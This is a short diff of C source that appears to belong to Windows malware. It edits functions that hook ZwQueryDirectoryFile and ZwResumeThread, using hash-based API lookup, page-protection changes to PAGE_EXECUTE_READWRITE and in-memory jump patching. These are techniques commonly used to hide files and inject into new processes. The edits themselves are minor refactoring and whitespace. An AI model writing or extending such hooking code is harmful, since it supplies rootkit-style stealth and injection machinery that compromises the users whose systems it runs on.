@@ -332,10 +332,10 @@ __declspec( naked ) void JmpToHookDirProc()
 	}
 }
 
-void ProtectPage( LPVOID lpAddr, DWORD dwParams )
+BOOL ProtectPage( LPVOID lpAddr, DWORD dwParams )
 {
 	DWORD dwOldProt = 0;
-	pVirtualProtectEx( (HANDLE)-1, lpAddr, 1024, dwParams, &dwOldProt );
+	return (BOOL)pVirtualProtectEx( (HANDLE)-1, lpAddr, 1024, dwParams, &dwOldProt );
 }
 
 void HookZwQueryDirectoryFile()
@@ -726,6 +726,7 @@ __declspec( naked ) void JmpToHookRthProc()
 	}
 }
 
+
 void HookZwResumeThread()
 {
 	dwHashPid  = NULL;
@@ -735,12 +736,14 @@ void HookZwResumeThread()
 	DWORD dwAddr  = (DWORD)&dwAddrRthProc;
 
 	PZwResumeThread ZwResumeThread = (PZwResumeThread)GetProcAddressEx( NULL, 5, 0xACF8BF39 );
-	
-	LPVOID lpMem;	LPVOID lpPtr;
+
+	LPVOID lpMem;	
+	LPVOID lpPtr;
 
 	lpPtr = (LPVOID)ZwResumeThread;
 
 	ProtectPage( lpPtr, PAGE_EXECUTE_READWRITE );
+	
 
 	lpMem = pVirtualAllocEx( (HANDLE)-1, NULL, 1024, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE );
 
@@ -759,7 +762,6 @@ void HookZwResumeThread()
 	{
 		lpPtr = (LPVOID)((DWORD)lpPtr + 1 );
 		m_memcpy( lpPtr, &dwAddr, 4 );
-	
 	}
 	else
 	{
@@ -783,8 +785,6 @@ void HookZwResumeThread()
 	}
 
 	ProtectPage( ZwResumeThread, PAGE_EXECUTE_READ );
-
-	return;
 }
 
 
